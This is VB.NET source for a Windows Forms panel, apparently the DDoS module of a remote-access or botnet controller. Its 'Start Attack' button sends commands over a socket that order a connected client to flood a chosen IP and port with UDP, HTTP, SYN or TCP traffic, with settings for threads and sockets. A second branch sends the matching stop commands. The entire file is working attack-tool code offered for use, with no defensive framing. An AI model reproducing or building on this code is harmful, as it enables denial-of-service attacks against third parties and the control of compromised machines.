﻿Public Class Form14
    Public Sock As Integer
    Dim yy As String = "||"
    Private Sub strtbutt_Click(sender As System.Object, e As System.EventArgs) Handles strtbutt.Click
        If strtbutt.Text = "Start Attack" Then
            strtbutt.Text = "Stop Attack"
            Ddosbar.Enabled = False
            Select Case Ddosbar.Value
                Case 1
                    Try
                        Form1.s.Send(Sock, "Fstart||UDP||" & attip.Text & yy & attport.Text & yy & attthrd.Text & yy & attsock.Text)
                        attlog.Text += "[" & TimeOfDay & "]" & " UDP Flooding started." & vbNewLine
                        attlog.SelectionStart = attlog.TextLength
                        attlog.ScrollToCaret()
                    Catch ex As Exception
                        attlog.Text += "[" & TimeOfDay & "]" & " Command failed." & vbNewLine
                        attlog.SelectionStart = attlog.TextLength
                        attlog.ScrollToCaret()
                    End Try
                Case 2
                    Try
                        Form1.s.Send(Sock, "Fstart||HTTP||" & attip.Text & yy & atttime.Text & yy & attthrd.Text)
                        attlog.Text += "[" & TimeOfDay & "]" & " HTTP Flooding started." & vbNewLine
                        attlog.SelectionStart = attlog.TextLength
                        attlog.ScrollToCaret()
                    Catch ex As Exception
                        attlog.Text += "[" & TimeOfDay & "]" & " Command failed." & vbNewLine
                        attlog.SelectionStart = attlog.TextLength
                        attlog.ScrollToCaret()
                    End Try
                Case 3
                    Try
                        Form1.s.Send(Sock, "Fstart||SYN||" & attip.Text & yy + attport.Text & yy & attthrd.Text & yy & attsock.Text)
                        attlog.Text += "[" & TimeOfDay & "]" & " SYN Flooding started." & vbNewLine
                        attlog.SelectionStart = attlog.TextLength
                        attlog.ScrollToCaret()
                    Catch ex As Exception
                        attlog.Text += "[" & TimeOfDay & "]" & " Command failed." & vbNewLine
                        attlog.SelectionStart = attlog.TextLength
                        attlog.ScrollToCaret()
                    End Try
                Case 4
                    Try
                        Form1.s.Send(Sock, "Fstart||TCP||" & attip.Text & yy & attport.Text & yy & atttime.Text & yy & attthrd.Text)
                        attlog.Text += "[" & TimeOfDay & "]" & " TCP Flooding started." & vbNewLine
                        attlog.SelectionStart = attlog.TextLength
                        attlog.ScrollToCaret()
                    Catch ex As Exception
                        attlog.Text += "[" & TimeOfDay & "]" & " Command failed." & vbNewLine
                        attlog.SelectionStart = attlog.TextLength
                        attlog.ScrollToCaret()
                    End Try
            End Select
        Else
            Select Case Ddosbar.Value
                Case 1
                    Try
                        Form1.s.Send(Sock, "Fstop||UDP||" + attip.Text + " " + attport.Text + " " + attthrd.Text + " " + attsock.Text)
                        attlog.Text += "[" & TimeOfDay & "]" & " UDP Flooding stopped." & vbNewLine
                        attlog.SelectionStart = attlog.TextLength
                        attlog.ScrollToCaret()
                    Catch ex As Exception
                        attlog.Text += "[" & TimeOfDay & "]" & " Command failed." & vbNewLine
                        attlog.SelectionStart = attlog.TextLength
                        attlog.ScrollToCaret()
                    End Try
                Case 2
                    Try
                        Form1.s.Send(Sock, "Fstop||HTTP")
                        attlog.Text += "[" & TimeOfDay & "]" & " HTTP Flooding stopped." & vbNewLine
                        attlog.SelectionStart = attlog.TextLength
                        attlog.ScrollToCaret()
                    Catch ex As Exception
                        attlog.Text += "[" & TimeOfDay & "]" & " Command failed." & vbNewLine
                        attlog.SelectionStart = attlog.TextLength
                        attlog.ScrollToCaret()
                    End Try
                Case 3
                    Try
                        Form1.s.Send(Sock, "Fstop||SYN||")
                        attlog.Text += "[" & TimeOfDay & "]" & " SYN Flooding stopped." & vbNewLine
                        attlog.SelectionStart = attlog.TextLength
                        attlog.ScrollToCaret()
                    Catch ex As Exception
                        attlog.Text += "[" & TimeOfDay & "]" & " Command failed." & vbNewLine
                        attlog.SelectionStart = attlog.TextLength
                        attlog.ScrollToCaret()
                    End Try
                Case 4
                    Try
                        Form1.s.Send(Sock, "Fstop||TCP")
                        attlog.Text += "[" & TimeOfDay & "]" & " TCP Flooding stopped." & vbNewLine
                        attlog.SelectionStart = attlog.TextLength
                        attlog.ScrollToCaret()
                    Catch ex As Exception
                        attlog.Text += "[" & TimeOfDay & "]" & " Command failed." & vbNewLine
                        attlog.SelectionStart = attlog.TextLength
                        attlog.ScrollToCaret()
                    End Try
            End Select
            strtbutt.Text = "Start Attack"
            Ddosbar.Enabled = True
        End If
    End Sub
End Class